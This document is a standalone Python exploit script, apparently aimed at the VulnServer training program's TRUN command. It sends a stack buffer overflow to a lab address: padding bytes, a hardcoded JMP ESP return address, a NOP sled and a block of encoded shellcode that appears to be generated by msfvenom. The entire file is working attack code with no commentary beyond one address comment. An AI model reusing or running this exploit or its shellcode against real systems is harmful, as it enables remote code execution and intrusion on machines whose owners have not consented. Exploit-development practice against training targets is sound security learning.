import socket
import sys

overflowPayload=("\xbb\x17\xed\xc7\xa8\xdb\xc5\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\x4d\xe3\x25\x5d\x8d"
"\x13\x2b\x9e\x6d\xe4\x4c\x16\x88\xd5\x4c\x4c\xd9\x46\x7d"
"\x06\x8f\x6a\xf6\x4a\x3b\xf8\x7a\x43\x4c\x49\x30\xb5\x63"
"\x4a\x69\x85\xe2\xc8\x70\xda\xc4\xf1\xba\x2f\x05\x35\xa6"
"\xc2\x57\xee\xac\x71\x47\x9b\xf9\x49\xec\xd7\xec\xc9\x11"
"\xaf\x0f\xfb\x84\xbb\x49\xdb\x27\x6f\xe2\x52\x3f\x6c\xcf"
"\x2d\xb4\x46\xbb\xaf\x1c\x97\x44\x03\x61\x17\xb7\x5d\xa6"
"\x90\x28\x28\xde\xe2\xd5\x2b\x25\x98\x01\xb9\xbd\x3a\xc1"
"\x19\x19\xba\x06\xff\xea\xb0\xe3\x8b\xb4\xd4\xf2\x58\xcf"
"\xe1\x7f\x5f\x1f\x60\x3b\x44\xbb\x28\x9f\xe5\x9a\x94\x4e"
"\x19\xfc\x76\x2e\xbf\x77\x9a\x3b\xb2\xda\xf3\x88\xff\xe4"
"\x03\x87\x88\x97\x31\x08\x23\x3f\x7a\xc1\xed\xb8\x7d\xf8"
"\x4a\x56\x80\x03\xab\x7f\x47\x57\xfb\x17\x6e\xd8\x90\xe7"
"\x8f\x0d\x36\xb7\x3f\xfe\xf7\x67\x80\xae\x9f\x6d\x0f\x90"
"\x80\x8e\xc5\xb9\x2b\x75\x8e\xcf\xab\x77\x49\xb8\xa9\x77"
"\x44\x64\x27\x91\x0c\x84\x61\x0a\xb9\x3d\x28\xc0\x58\xc1"
"\xe6\xad\x5b\x49\x05\x52\x15\xba\x60\x40\xc2\x4a\x3f\x3a"
"\x45\x54\x95\x52\x09\xc7\x72\xa2\x44\xf4\x2c\xf5\x01\xca"
"\x24\x93\xbf\x75\x9f\x81\x3d\xe3\xd8\x01\x9a\xd0\xe7\x88"
"\x6f\x6c\xcc\x9a\xa9\x6d\x48\xce\x65\x38\x06\xb8\xc3\x92"
"\xe8\x12\x9a\x49\xa3\xf2\x5b\xa2\x74\x84\x63\xef\x02\x68"
"\xd5\x46\x53\x97\xda\x0e\x53\xe0\x06\xaf\x9c\x3b\x83\xcf"
"\x7e\xe9\xfe\x67\x27\x78\x43\xea\xd8\x57\x80\x13\x5b\x5d"
"\x79\xe0\x43\x14\x7c\xac\xc3\xc5\x0c\xbd\xa1\xe9\xa3\xbe"
"\xe3")

#625011af
stringToSend="TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90"*32 + overflowPayload


try:
    mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mySocket.connect(("10.0.2.15",9999))
    bytes = stringToSend.encode(encoding="latin1")
    mySocket.send(bytes)
    mySocket.close()

except KeyboardInterrupt:
    sys.exit()
except Exception as e:
    print(e)
    sys.exit()

